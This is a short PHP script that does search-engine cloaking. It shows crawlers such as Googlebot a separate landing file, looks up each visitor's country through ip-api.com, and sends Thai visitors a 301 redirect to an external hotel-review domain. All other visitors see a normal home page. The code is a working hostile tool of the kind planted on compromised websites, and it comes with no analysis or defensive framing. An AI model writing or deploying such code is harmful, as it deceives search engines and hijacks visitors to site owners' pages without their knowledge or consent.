<?php

$target = "https://hotelbangkokreview.com/th/";
$country = "TH";

function isMobile(){
    return preg_match(
        "/mobile|android|iphone|ipad|ipod|opera mini|blackberry|webos|iemobile|windows phone|kindle|silk/i",
        strtolower($_SERVER["HTTP_USER_AGENT"])
    );
}

function getVisitorIP() {
    $ipKeys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER)) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
    }

    return $_SERVER['REMOTE_ADDR'];
}

$referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "";

$user_agent = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : "";

$bunvisEngine = [
    "googlebot",
    "bingbot",
    "slurp",
    "baiduspider",
    "duckduckbot",
    "yandexbot",
    "ask.com",
    "aol",
    "naverbot",
    "sogou",
    "exalead",
    "goo",
    "qwant",
    "mojeekbot",
    "yippybot",
    "gigablast",
    "lycos",
    "webcrawler",
    "metacrawler",
    "infoseek",
    "wolframalpha",
    "teoma",
    "dogpile",
    "alltheweb",
    "mamma",
    "excite",
    "yahooligans",
    "search.com",
    "ask jeeves",
    "gosh",
    "blekko",
    "webring",
    "metager",
    "searx",
    "startpage",
    "freenom",
    "searchencrypt",
    "findthatfile",
    "trove",
    "kiddle",
];

function getCountryCode() {

    $visitorIP = getVisitorIP();
    $url = "http://ip-api.com/json/" . $visitorIP . "?fields=countryCode";

    $response = @file_get_contents($url);

    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['countryCode'])) {
            return strtoupper($data['countryCode']);
        }
    }

    return null;
}

function sebFungsi($user_agent, $bunvisEngine)
{
    foreach ($bunvisEngine as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}


/* =========================
FINAL LOGIC
========================= */

if (sebFungsi($user_agent, $bunvisEngine)) {
    include "lp.txt";
    exit;
}

$userCountry = getCountryCode();

/* MOBILE */
if (isMobile()) {

    if ($userCountry === $country) {

        header("Location: $target", true, 301);
        exit;

    } else {

        include "home.txt";
        exit;

    }

}

/* DESKTOP */

if ($userCountry === $country) {

    header("Location: $target", true, 301);
    exit;

}

include "home.txt";
exit;

?>